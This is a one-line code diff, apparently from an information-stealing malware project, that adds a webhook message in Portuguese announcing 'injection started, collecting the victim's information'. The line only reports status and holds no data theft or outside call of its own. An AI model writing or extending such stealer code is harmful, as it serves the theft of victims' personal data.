@@ -1,0 +1,1 @@
+await wb.send("**Injeção Começada, recolhendo informações da vítima**")
